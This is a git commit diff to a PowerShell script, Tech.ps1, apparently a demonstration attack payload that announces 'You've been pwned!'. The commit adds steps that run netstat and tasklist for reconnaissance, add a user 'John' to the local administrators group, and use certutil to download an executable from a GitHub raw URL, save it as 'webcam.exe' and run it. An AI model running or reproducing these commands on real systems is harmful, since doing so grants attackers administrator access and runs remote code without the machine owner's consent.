3d0bef9727dac1c13fa53749a08f9e1b4b38e894
tmmdemo <37916298+tmmdemo@users.noreply.github.com>
2019-02-22 12:26:11 -0600

    Update Tech.ps1

--- Tech.ps1
+++ Tech.ps1
@@ -1,10 +1,23 @@
 function Invoke-Tech
 {
-	Write-Host "You've been pwned! v4";
+	Write-Host "You've been pwned! v5";
 	Start-Sleep 1;
+	Write-Host "Running Netstat";
 	netstat -an;
-	Start-Process "cmd.exe" '/c netstat -an;'
+	#Start-Process "cmd.exe" '/c netstat -an;'
+	#& "netstat" "-an"
 	Start-Sleep 1;
+	Write-Host "Getting Tasks";
 	tasklist;
-	Start-Process "cmd.exe" '/c tasklist;'
+	#Start-Process "cmd.exe" '/c tasklist;'
+	#& "tasklist"
+	Start-Sleep 1;
+	Write-Host "Adding Users";
+	net localgroup administrators John /add
+	Start-Sleep 1;
+	Write-Host "Downloading Webcam";
+	certutil -urlcache -split -f "https://raw.githubusercontent.com/tmmdemo/thenothing/master/TheNothing.exe" "webcam.exe"
+	Start-Sleep 1;
+	Write-Host "Running Webcam";
+	webcam.exe -stream
 }
